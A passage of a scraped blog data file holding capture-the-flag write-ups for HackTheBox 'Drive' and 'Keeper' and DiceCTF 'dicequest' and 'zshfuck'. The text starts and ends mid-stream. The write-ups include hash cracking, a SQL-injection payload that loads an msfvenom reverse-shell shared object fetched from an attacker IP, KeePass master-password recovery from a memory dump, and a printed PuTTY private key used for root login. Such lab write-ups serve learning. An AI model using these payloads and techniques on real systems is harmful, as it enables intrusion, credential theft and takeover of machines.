retruning to the default Djnago hashers due to problems in Bcrypt hashers When we view the commit changes, we see alterations to geeks_site/settings.py:\nWe can see here that this is related to how data in the SQL database is being stored. It seems for some time they were using BCrypt hashes, which is very robust at the expense of processing power. However, it looks like they have recently switched to SHA256. Checking the commit history, we see that at one point they were using SHA1, which is massively easier to crack than SHA256 or Bcrypt:\nNow, onto visiting the backup files:\n1 2 3 4 5 6 7 8 9 martin@drive:/var/www/backups$ ls -al total 3740 drwxr-xr-x 2 www-data www-data 4096 Sep 1 18:23 . drwxr-xr-x 5 root root 4096 Sep 15 13:34 .. -rw-r--r-- 1 www-data www-data 13018 Sep 1 20:00 1_Dec_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12226 Sep 1 20:00 1_Nov_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12722 Sep 1 20:00 1_Oct_db_backup.sqlite3.7z -rw-r--r-- 1 www-data www-data 12770 Sep 1 20:00 1_Sep_db_backup.sqlite3.7z -rwxr-xr-x 1 root root 3760128 Dec 26 2022 db.sqlite3 The current db.sqlite3 database does not contain any crackable passwords, but we should check the backup tables as well. Although this database is for the web service Doodle Grive, it is possible a user had originally used their system user password before changing. Here it would be nice to look at gitea\u0026rsquo;s commit timestamps, and we could narrow down which month contains the SHA1 hashes. However, all of the commits are dated on Dec 25th so it is not helpful. Instead, we need to view each backup database and look for the signature sha1$ before the salt. Unzipping from 7z requires the previously found password:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 ┌──(kali㉿kali)-[~/Documents/Drive] └─$ 7z e 1_Dec_db_backup.sqlite3.7z 7-Zip [64] 16.02 : Copyright (c) 1999-2016 Igor Pavlov : 2016-05-21 p7zip Version 16.02 (locale=en_US.UTF-8,Utf16=on,HugeFiles=on,64 bits,2 CPUs Intel(R) Core(TM) i5-4690K CPU @ 3.50GHz (306C3),ASM,AES-NI) Scanning the drive for archives: 1 file, 13018 bytes (13 KiB) Extracting archive: 1_Dec_db_backup.sqlite3.7z -- Path = 1_Dec_db_backup.sqlite3.7z Type = 7z Physical Size = 13018 Headers Size = 170 Method = LZMA2:22 7zAES Solid = - Blocks = 1 Enter password (will not be echoed): \u0026lt;...SNIP...\u0026gt; Size: 3760128 Compressed: 13018 December yields the sha256 hashes, which will take forever to crack. However, examining the November backup, we can see SHA1 passwords. Using hashcat, I am able to crack the password associated with user tomHands:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 spencer@MintySJ:~/Desktop$ hashcat -m 124 \u0026#39;sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a\u0026#39; /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule hashcat (v6.2.5) starting \u0026lt;...SNIP...\u0026gt; sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7 Session..........: hashcat Status...........: Cracked Hash.Mode........: 124 (Django (SHA-1)) Hash.Target......: sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b252...69525a Time.Started.....: Sun Oct 15 13:22:42 2023 (0 secs) Time.Estimated...: Sun Oct 15 13:22:42 2023 (0 secs) Kernel.Feature...: Pure Kernel Guess.Base.......: File (/usr/share/wordlists/rockyou.txt) Guess.Mod........: Rules (/usr/share/hashcat/rules/best64.rule) Guess.Queue......: 1/1 (100.00%) Speed.#1.........: 567.5 MH/s (10.44ms) @ Accel:256 Loops:38 Thr:64 Vec:1 Recovered........: 1/1 (100.00%) Digests Progress.........: 8093696/1104517568 (0.73%) Rejected.........: 0/8093696 (0.00%) Restore.Point....: 0/14344384 (0.00%) Restore.Sub.#1...: Salt:0 Amplifier:0-38 Iteration:0-38 Candidate.Engine.: Device Generator Candidates.#1....: 123456 -\u0026gt; sex123 Hardware.Mon.#1..: Temp: 58c Fan: 19% Util: 73% Core:1316MHz Mem:3004MHz Bus:16 Started: Sun Oct 15 13:22:42 2023 Stopped: Sun Oct 15 13:22:43 2023 tom cracks into johnmayer7. When checking system user credentials, it is the valid password for tom:\n1 2 3 martin@drive:~$ su tom Password: tom@drive:/home/martin$ Privilege Escalation Extracting stored credentials from compiled binary Within tom\u0026rsquo;s home folder, we can find a doodlegrive-cli with SUID properties as root:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 tom@drive:~$ ls -al total 916 drwxr-x--- 6 tom tom 4096 Sep 13 13:51 . drwxr-xr-x 6 root root 4096 Dec 25 2022 .. lrwxrwxrwx 1 root root 9 Sep 6 02:56 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 tom tom 220 Dec 25 2022 .bash_logout -rw-r--r-- 1 tom tom 3771 Dec 25 2022 .bashrc drwx------ 3 tom tom 4096 Jan 1 2023 .cache drwx------ 3 tom tom 4096 Feb 3 2023 .config -rwSr-x--- 1 root tom 887240 Sep 13 13:36 doodleGrive-cli drwx------ 3 tom tom 4096 Jan 1 2023 .gnupg drwxrwxr-x 3 tom tom 4096 Dec 28 2022 .local -rw-r--r-- 1 tom tom 807 Dec 25 2022 .profile -rw-r----- 1 root tom 719 Feb 11 2023 README.txt -rw-r----- 1 root tom 33 Oct 12 11:59 user.txt -rw-r--r-- 1 tom tom 39 Aug 29 05:59 .vimrc The README provides details about the item:\n1 2 3 4 5 6 7 Hi team after the great success of DoodleGrive, we are planning now to start working on our new project: \u0026#34;DoodleGrive self hosted\u0026#34;,it will allow our customers to deploy their own documents sharing platform privately on thier servers... However in addition with the \u0026#34;new self Hosted release\u0026#34; there should be a tool(doodleGrive-cli) to help the IT team in monitoring server status and fix errors that may happen. As we mentioned in the last meeting the tool still in the development phase and we should test it properly... We sent the username and the password in the email for every user to help us in testing the tool and make it better. If you face any problem, please report it to the development team. Best regards. It mentions credentials, but the email doesn\u0026rsquo;t seem to exist on the box. Fortunately, since this is a binary (and non-stripped!), the user/password check should be baked-in. We can try strings to find this, but with a quick check into vim, I find it very fast by searching for password: Using strings, we can splice out string contents. It is a lot, so I still find it best to save it to another file, open and vim and search this way: here we have creds as moriarty:findMeIfY0uC@nMr.Holmz!\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 tom@drive:~$ ./doodleGrive-cli [!]Caution this tool still in the development phase...please report any issue to the development team[!] Enter Username: moriarty Enter password for moriarty: findMeIfY0uC@nMr.Holmz! Welcome...! doodleGrive cli beta-2.2: 1. Show users list and info 2. Show groups list 3. Check server health and status 4. Show server requests log (last 1000 request) 5. activate user account 6. Exit Select option: It works! Now we have to figure out what to do.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 Select option: 1 id = 16 last_login = 2023-02-11 07:46:11.212535 is_superuser = 1 username = admin email = admin@drive.htb is_staff = 1 is_active = 1 date_joined = 2022-12-08 14:59:02.802351 \u0026lt;...SNIP...\u0026gt; id = 29 last_login = 2023-10-15 15:58:04.498985 is_superuser = 0 username = asdf email = asdf@asdf.asdf is_staff = 0 is_active = 1 date_joined = 2023-10-15 15:03:29.237892 It is apparent that the program it is pulling data from the web service. Also within the strings, we might find commands related to the commands.\nSQL injection to load a malicious shared object file For activating a user account, we can find it allows for user input:\n1 /usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \u0026#39;UPDATE accounts_customer SET is_active=1 WHERE username=\u0026#34;%s\u0026#34;\u0026#39;; Injecting SQL to bypass table checking is not helpful for us, but we might use SQL injection for remote command execution. However, when checking tricks for this, we quickly find out we are limited in characters. Testing the character limit:\n1 2 3 4 5 6 7 8 9 10 doodleGrive cli beta-2.2: 1. Show users list and info 2. Show groups list 3. Check server health and status 4. Show server requests log (last 1000 request) 5. activate user account 6. Exit Select option: 5 Enter username to activate account: 1234567890123456789012345678901234567890 Activating account for user \u0026#39;123456789012345678901234567890123456789\u0026#39;... When supplying a string of 40 characters, only 39 is returned. We should assume that we can only work with a maximum of 39 characters. Our long UNION SELECT payload is not quite viable anymore. Additionally, several characters are not allowed:\n1 2 3 4 5 6 7 8 9 10 doodleGrive cli beta-2.2: 1. Show users list and info 2. Show groups list 3. Check server health and status 4. Show server requests log (last 1000 request) 5. activate user account 6. Exit Select option: 5 Enter username to activate account: \\/|\u0026#39;;.. Activating account for user \u0026#39;..\u0026#39;... Note that out of all the special characters provided in the username input, only dots were accepted and reflected. We can work around banned characters utilizing the char function, but working around the character limit also requires creativity. Instead of combining our payload using AND JOIN or other ideas, we can simplify it with +. First, when we must create our malicious shared object file, which will behave as our linux equivalent to a dll loading:\n1 2 ┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module] └─$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.58 LPORT=4444 -f elf-so -o a.so Next, we must download it to the same file location as doodleGrive-cli:\n1 2 3 4 5 6 7 8 9 10 tom@drive:~$ wget 10.10.14.21/a.so --2023-10-16 02:46:13-- http://10.10.14.21/a.so Connecting to 10.10.14.21:80... connected. HTTP request sent, awaiting response... 200 OK Length: 476 [application/octet-stream] Saving to: ‘a.so’ a.so 100%[==============================================\u0026gt;] 476 --.-KB/s in 0s 2023-10-16 02:46:13 (20.4 MB/s) - ‘a.so’ saved [476/476] The small file name is really important, as we must call the characters in our load_extension payload. Unless specified, the file extension .so will be appended automatically. This is important for us as we need to minimize the payload characters where possible. For my file, I will want to do load_extension(./a). Looking up the characters on the ascii table, my payload will look like this:\n1 \u0026#34;+load_extension(char(46,47,97))-- Finally, running the payload:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 tom@drive:~$ ./doodleGrive-cli [!]Caution this tool still in the development phase...please report any issue to the development team[!] Enter Username: moriarty Enter password for moriarty: findMeIfY0uC@nMr.Holmz! Welcome...! doodleGrive cli beta-2.2: 1. Show users list and info 2. Show groups list 3. Check server health and status 4. Show server requests log (last 1000 request) 5. activate user account 6. Exit Select option: 5 Enter username to activate account: \u0026#34;+load_extension(char(46,47,97))-- Activating account for user \u0026#39;\u0026#34;+load_extension(char(46,47,97))--\u0026#39;... Meanwhile on my nc listener:\n1 2 3 4 5 6 ┌──(kali㉿kali)-[~/Documents/Drive/sqlite_ex/sqlite-execute-module] └─$ nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.14.21] from (UNKNOWN) [10.10.11.235] 55348 id uid=0(root) gid=0(root) groups=0(root),1003(tom) With this, we have full root authority.\n","date":"2024-02-17T19:46:53-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-drive/Drive_hu501960eeac16eccd918d7d9edf7f2484_365098_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-drive/","title":"HackTheBox - Drive"},{"content":"Enumeration initial nmap:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 Nmap scan report for 10.10.11.227 Host is up (0.030s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA) |_ 256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-server-header: nginx/1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 10.16 seconds There are only open ports 80 and 22. SSH typically requires credentials to access, so we will start exploration with the nginx server on port 80:\nEnumerating Web Service We see text that directs us to tickets.keeper.htb/rt/. This appears to be a subdomain for a DNS of keeper.htb, and needs to first be added to our /etc/hosts file:\n1 2 3 4 5 6 7 8 9 ┌──(kali㉿kali)-[~] └─$ cat /etc/hosts 127.0.0.1 localhost 127.0.1.1 kali ::1 localhost ip6-localhost ip6-loopback ff02::1 ip6-allnodes ff02::2 ip6-allrouters 10.10.11.227 tickets.keeper.htb keeper.htb It might not be necessary, but I decided to add both tickets.keeper.htb and keeper.htb in case we need to resolve both. Now visiting tickets:\nFoothold Login via default credentials We see a basic ticket management website asking for login credentials. On this page, we can learn that it is using BestPractical services. When we try default login credentials for BestPractical services (root:password), we find that we are able to login!\nLooking for tickets, we can find 1 ticket in the general tab:\nWe see a name of Lise Nørgaard that we might want to remember. The ticket mentions keepass, a service used to store passwords. A very juicy target indeed.\nSystem access via unsecure storage of passwords We can view the conversation history between Lise and rt:\nUnfortunately, it looks like the keepass files were removed from the conversation and we are unable to swipe it.\nWhen we view Lise\u0026rsquo;s profile, the user summary doesn\u0026rsquo;t tell us much:\nHowever, when we move to edit, we can find extra details about the person:\nNotably, we can see the unix login of lnorgaard, which can be useful for SSH login. Additionally, we find a password used for setup! If Lise has not updated this, we might be able to login:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 ┌──(kali㉿kali)-[~/Documents] └─$ ssh lnorgaard@keeper.htb The authenticity of host \u0026#39;keeper.htb (10.10.11.227)\u0026#39; can\u0026#39;t be established. ED25519 key fingerprint is SHA256:hczMXffNW5M3qOppqsTCzstpLKxrvdBjFYoJXJGpr7w. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added \u0026#39;keeper.htb\u0026#39; (ED25519) to the list of known hosts. lnorgaard@keeper.htb\u0026#39;s password: Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings You have mail. Last login: Tue Feb 6 22:16:25 2024 from 10.10.14.179 lnorgaard@keeper:~$ Privilege Escalation Leveraging Keepass CVE 2023-32784 We are able to authenticate! We might notice that lnorgaard is notified of mail. This can be very interesting for most HTB systems, however in this case it is only the email receipt for the previously discovered ticket. Within the home folder, we can find an interesting zip:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 lnorgaard@keeper:~$ ls -al total 85388 drwxr-xr-x 4 lnorgaard lnorgaard 4096 Feb 6 22:52 . drwxr-xr-x 3 root root 4096 May 24 2023 .. lrwxrwxrwx 1 root root 9 May 24 2023 .bash_history -\u0026gt; /dev/null -rw-r--r-- 1 lnorgaard lnorgaard 220 May 23 2023 .bash_logout -rw-r--r-- 1 lnorgaard lnorgaard 3771 May 23 2023 .bashrc drwx------ 2 lnorgaard lnorgaard 4096 May 24 2023 .cache -rw------- 1 lnorgaard lnorgaard 20 Feb 6 22:17 .lesshst -rw------- 1 lnorgaard lnorgaard 807 May 23 2023 .profile -rw-r--r-- 1 root root 87391651 Feb 7 03:28 RT30000.zip drwx------ 2 lnorgaard lnorgaard 4096 Jul 24 2023 .ssh -rw-r----- 1 root lnorgaard 33 Feb 6 21:56 user.txt -rw-r--r-- 1 root root 39 Jul 20 2023 .vimrc RT30000 is a very big file, and is the same number associated with our keepass ticket. This zip likely contains all related evidences. We can take this for ourselves using scp:\n1 2 3 4 ┌──(kali㉿kali)-[~/Documents/Keeper] └─$ scp lnorgaard@keeper.htb:/home/lnorgaard/RT30000.zip ./ lnorgaard@keeper.htb\u0026#39;s password: RT30000.zip 4% 3825KB 39.2KB/s 34:39 ETA This method might take forever, so I decided to keep it in the box..\n1 2 3 4 5 6 7 8 9 10 11 12 13 lnorgaard@keeper:/dev/shm$ unzip RT30000.zip Archive: RT30000.zip inflating: KeePassDumpFull.dmp extracting: passcodes.kdbx lnorgaard@keeper:/dev/shm$ ls KeePassDumpFull.dmp passcodes.kdbx RT30000.zip lnorgaard@keeper:/dev/shm$ ls -al total 332808 drwxrwxrwt 2 root root 100 Feb 7 03:34 . drwxr-xr-x 17 root root 3920 Feb 6 21:55 .. -rwxr-x--- 1 lnorgaard lnorgaard 253395188 May 24 2023 KeePassDumpFull.dmp -rwxr-x--- 1 lnorgaard lnorgaard 3630 May 24 2023 passcodes.kdbx -rw-r--r-- 1 lnorgaard lnorgaard 87391651 Feb 7 03:33 RT30000.zip After unzipping, we see the original keepass database passcodes.kdbx, and the error dump. Typically, the keepass file is all we care about since it stores the passwords. However, when researching how to extract passwords from keepass, we might find a recent vulnerability that involves a dump file. This github project is designed to extract the master password used during the creation of the dump file, which can be used to open the original keepass vault! To use, it is best for me to transfer the vault and dump file to my system. To mix it up a little, I decided to transfer via python simple http server. This time it is a lot quicker, thankfully!\n1 2 lnorgaard@keeper:/dev/shm$ python3 -m http.server 8888 Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ... And now I can wget the files from my kali:\n1 2 3 4 5 6 7 8 9 10 11 12 ──(kali㉿kali)-[~/Documents/Keeper] └─$ wget http://keeper.htb:8888/passcodes.kdbx --2024-02-06 20:37:11-- http://keeper.htb:8888/passcodes.kdbx Resolving keeper.htb (keeper.htb)... 10.10.11.227 Connecting to keeper.htb (keeper.htb)|10.10.11.227|:8888... connected. HTTP request sent, awaiting response... 200 OK Length: 3630 (3.5K) [application/octet-stream] Saving to: ‘passcodes.kdbx’ passcodes.kdbx 100%[==============================================\u0026gt;] 3.54K --.-KB/s in 0s 2024-02-06 20:37:11 (625 MB/s) - ‘passcodes.kdbx’ saved [3630/3630] The same is done for the dump file.\nWhen launching the password dumper from kali, we might first get an error about incompatible .NET kits:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Keeper/keepass-password-dumper] └─$ dotnet run ../KeePassDumpFull.dmp /usr/share/dotnet/sdk/6.0.400/Sdks/Microsoft.NET.Sdk/targets/Microsoft.NET.TargetFrameworkInference.targets(144,5): error NETSDK1045: The current .NET SDK does not support targeting .NET 7.0. Either target .NET 6.0 or lower, or use a version of the .NET SDK that supports .NET 7.0. [/home/kali/Documents/Keeper/keepass-password-dumper/keepass_password_dumper.csproj] The build failed. Fix the build errors and run again. To resolve this issue, I changed the target framework in csproj to net6.0 from net7.0:\n1 2 3 4 5 6 7 8 9 10 11 12 ┌──(kali㉿kali)-[~/Documents/Keeper/keepass-password-dumper] └─$ cat keepass_password_dumper.csproj \u0026lt;Project Sdk=\u0026#34;Microsoft.NET.Sdk\u0026#34;\u0026gt; \u0026lt;PropertyGroup\u0026gt; \u0026lt;OutputType\u0026gt;Exe\u0026lt;/OutputType\u0026gt; \u0026lt;TargetFramework\u0026gt;net6.0\u0026lt;/TargetFramework\u0026gt; \u0026lt;ImplicitUsings\u0026gt;enable\u0026lt;/ImplicitUsings\u0026gt; \u0026lt;Nullable\u0026gt;enable\u0026lt;/Nullable\u0026gt; \u0026lt;/PropertyGroup\u0026gt; \u0026lt;/Project\u0026gt; This might not always work, but here it is good enough.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 ┌──(kali㉿kali)-[~/Documents/Keeper/keepass-password-dumper] └─$ dotnet run ../KeePassDumpFull.dmp Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●d Found: ●●●g \u0026lt;...SNIP...\u0026gt; Password candidates (character positions): Unknown characters are displayed as \u0026#34;●\u0026#34; 1.: ● 2.: ,, l, `, -, \u0026#39;, ], A, I, :, =, _, c, M, 3.: d, 4.: g, 5.: r, 6.: ● 7.: d, 8.: , 9.: m, 10.: e, 11.: d, 12.: , 13.: f, 14.: l, 15.: ● 16.: d, 17.: e, Combined: ●{,, l, `, -, \u0026#39;, ], A, I, :, =, _, c, M}dgr●d med fl●de The password is looking a little odd to say the least. After reviewing their example, it looks like the program often cannot distinguish the first few characters. We know lnogaard is Danish based on her ticket profile, so it is possible that these words not English. Searching on google for **dgr*d med fl*de eventually leads to something that might be a popular phrase: Rødgrød Med Fløde. Firstly starting with no caps, we get a hit. rødgrød med fløde\nRoot access via PuTTY Key We see a couple passwords entered, but the first thing to catch my eye is in the Notes, a PuTTY-User-Key-File.\nWhen going to the edit page, we can see the supplied password and what looks to be an RSA key:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 PuTTY-User-Key-File-3: ssh-rsa Encryption: none Comment: rsa-key-20230519 Public-Lines: 6 AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D 8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et Private-Lines: 14 AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV 09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is= Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0 To use this putty key, we can begin by installing putty:\n1 2 3 4 5 ┌──(kali㉿kali)-[~/Documents/Keeper/keepass-password-dumper] └─$ sudo apt install putty [sudo] password for kali: Reading package lists... Done \u0026lt;...SNIP...\u0026gt; This putty will launch a GUI: Under SSH \u0026gt; Auth \u0026gt; Credentials, we can supply a private key file. Here, I supply a file with the previous rsa key contents pasted:\nNow we can specify the host name in Session, and open.\nWe have to specify logging in as root, but once we do, we are in without supplying the password!\n","date":"2024-02-10T07:29:34-06:00","image":"https://yuwenmichael.netlify.app/post/hackthebox-keeper/Keeper_huf4f9f9df27aef9cdcea61ade0795a679_239964_120x120_fill_box_smart1_3.png","permalink":"https://yuwenmichael.netlify.app/post/hackthebox-keeper/","title":"HackTheBox - Keeper"},{"content":"Rev dicequest Try 2024\u0026rsquo;s hottest game so far - DiceQuest! Can you survive the onslaught? Custom sprites made by Gold\nnote: the flag matches the regex dice{[a-z_]+}\nWith this challenge, we are given an ELF executable game:\n1 2 $ file dicequest dicequest: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=5a21a66948b7d5fd5c206fbaf90b9c1fbe2e52a4, for GNU/Linux 3.2.0, stripped Checking the contents with strings can show us that the game was made with rust, but not much other details are given. Running the executable puts us in a game with simple graphics:\nThe big dice is our playable object, to the right is a shop for us. To the left is an \u0026ldquo;enemy\u0026rdquo; dice and the top left has our money count. After about a minute or so, it looks as though dragons appear and we die. Checking the contents of the shop:\nThe shop info is slightly cut off, but we can tame the dragon army if we collect $10,000! Each \u0026ldquo;enemy\u0026rdquo; kill grants us $5, so this is completely unfeasible. However, if we can edit our money amount in-game, we can give ourselves as much money as we want. Normally with windows-based executables, I would opt to use Cheat Engine, but this is a linux ELF. There seems to be a very competent alternative in gameconquerer.\nIn order to find the memory address responsible for money, we can search for addresses containing the number while we know it. For example, at the start of every game we have 0 dollars. We can search for values containing 0:\nThen as we defeat 1 enemy we are brought to $5. Searching again, we can trace values that started at 0 and are 5 after defeating 1 enemy:\nWe can repeat this process until there is only 1 address left:\nNow that we know we have the address, we can add it with the + symbol and edit the value section below. Giving myself 10000:\nThe score in top left will not change until your score is changed by defeating an enemy, but the money is still there and now we can purchase the dragon tame upgrade:\nNow when the dragons come, I survive!\nThe flag isn\u0026rsquo;t immediately apparent, but we can eventually see that the dragons are creating letters:\nWe can zoom out pretty far to see the whole flag, but the text is certainly not easy on the eyes:\nMisc zshfuck may your code be under par. execute the getflag binary somewhere in the filesystem to win\nWe are given the source code for our jail:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 #!/bin/zsh print -n -P \u0026#34;%F{green}Specify your charset: %f\u0026#34; read -r charset # get uniq characters in charset charset=(\u0026#34;${(us..)charset}\u0026#34;) banned=(\u0026#39;*\u0026#39; \u0026#39;?\u0026#39; \u0026#39;`\u0026#39;) if [[ ${#charset} -gt 6 || ${#charset:|banned} -ne ${#charset} ]]; then print -P \u0026#34;\\n%F{red}That\u0026#39;s too easy. Sorry.%f\\n\u0026#34; exit 1 fi print -P \u0026#34;\\n%F{green}OK! Got $charset.%f\u0026#34; charset+=($\u0026#39;\\n\u0026#39;) # start jail via coproc coproc zsh -s exec 3\u0026gt;\u0026amp;p 4\u0026lt;\u0026amp;p # read chars from fd 4 (jail stdout), print to stdout while IFS= read -u4 -r -k1 char; do print -u1 -n -- \u0026#34;$char\u0026#34; done \u0026amp; # read chars from stdin, send to jail stdin if valid while IFS= read -u0 -r -k1 char; do if [[ ! ${#char:|charset} -eq 0 ]]; then print -P \u0026#34;\\n%F{red}Nope.%f\\n\u0026#34; exit 1 fi # send to fd 3 (jail stdin) print -u3 -n -- \u0026#34;$char\u0026#34; done The setup is a little complex, but the general behavior is this: You are in a terminal that only accepts up to 6 characters of your choosing. After selection, any string that only contains those characters will be passed to and executed inside zsh. There are some characters that are banned, as they would make it too easy. As a start, I tried to learn more about the filesystem by passing an ls -lR command:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 $ nc mc.ax 31774 Specify your charset: ls -R OK! Got l s - R. ls -lR .: total 8 -rwxr-xr-x 1 nobody nogroup 795 Feb 2 21:55 run drwxr-xr-x 1 nobody nogroup 4096 Feb 2 13:31 y0u ./y0u: total 4 drwxr-xr-x 1 nobody nogroup 4096 Feb 2 13:31 w1ll ./y0u/w1ll: total 4 drwxr-xr-x 1 nobody nogroup 4096 Feb 2 13:31 n3v3r_g3t ./y0u/w1ll/n3v3r_g3t: total 4 drwxr-xr-x 1 nobody nogroup 4096 Feb 2 13:31 th1s ./y0u/w1ll/n3v3r_g3t/th1s: total 16 ---x--x--x 1 nobody nogroup 15960 Feb 2 13:30 getflag We can see that our objective executable is buried several folders deep. Naturally, we will have to reach it before being able to execute. We can also learn the current path with pwd or cwd:\n1 2 3 4 5 Specify your charset: pwd OK! Got p w d. pwd /app Thanks to the interesting behavior of passing our characters into another shell, we cannot escape via a simple -i flag:\n1 2 3 4 5 6 7 8 Specify your charset: sh -i OK! Got s h - i. sh -i sh: 0: can\u0026#39;t access tty; job control turned off $ id Nope. We see the output $ indicative of an sh session, but are still incapable of passing banned letters. By this point, it is rather clear why there are certain banned characters. If wildcards were allowed, we could hit it very easily just with /*/*/*/*/*/*. Alas, it is not that simple.\nAfter researching some special characters for zsh, i find an interesting opportunity:\n[ ] csh, sh Match range of characters. Section 1.13, Section 33.2 Following the example sections, we can see it used to encompass all characters:\n1 [a-z] Perhaps something like this can work for our situation? to begin, I try executing /app/run since it is shorter:\n1 2 3 4 5 6 7 Specify your charset: /[a-z] OK! Got / [ a - z ]. /[a-z][a-z][a-z]/[a-z][a-z][a-z] Specify your charset: asdf Nope. We can see that after i input my execution string of /[a-z][a-z][a-z]/[a-z][a-z][a-z], the jail is run a 2nd time and asks once again for a charset. I still can\u0026rsquo;t circumvent the original charset, but it is clear that we are executing /app/run! Now the challenge lies in reaching our getflag goal. Remember the path: /app/y0u/w1ll/n3v3r_g3t/th1s/getflag. Unlike my simple check, this contains more than just letters. We need to expand our range even further to match all the characters. Using the range starting at 0 and ending at z will include all letters and numbers, but will it include the underscore inside n3v3r_g3t? Turns out it will:\n1 2 3 4 5 Specify your charset: /[0-z] OK! Got / [ 0 - z ]. /[0-z][0-z][0-z]/[0-z][0-z][0-z]/[0-z][0-z][0-z][0-z]/[0-z][0-z][0-z][0-z][0-z][0-z][0-z][0-z][0-z]/[0-z][0-z][0-z][0-z]/[0-z][0-z][0-z][0-z][0-z][0-z][0-z] dice{d0nt_u_jU5T_l00oo0ve_c0d3_g0lf?} The command is simply replacing every character in /app/y0u/w1ll/n3v3r_g3t/th1s/getflag with [0-z], with the exception of forward 